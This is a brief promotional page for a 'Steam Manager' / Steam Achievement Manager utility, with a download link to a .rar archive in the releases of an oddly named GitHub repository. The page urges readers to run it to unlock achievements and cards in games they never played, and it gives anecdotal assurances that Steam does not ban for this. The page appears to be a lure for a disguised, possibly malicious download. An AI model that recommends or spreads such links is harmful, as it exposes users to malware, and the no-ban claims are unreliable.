[üìÅSteam Manager](https://github.com/Shef228/QQQ/releases/download/qeq/Steam.Manager.rar)

Steam Achievement Manager is a small utility that allows you to get game achievements inside Steam. In addition, it provides access to cards and their parameters. The program was created by enthusiasts, exclusively for free use by players.

To get cards you just need to launch Steam Achievement Manager and double-click on the game from the list.

And it will show that you are playing the game you chose.

If you select a game that you do not have, there will be no card and will not show that you are playing it

ATTENTION!

Many people write that Steam does not ban you for this. I wasn't banned either. I tried it on two accounts a long time ago, everything is fine.

I earned achievements in games I didn‚Äôt even play.
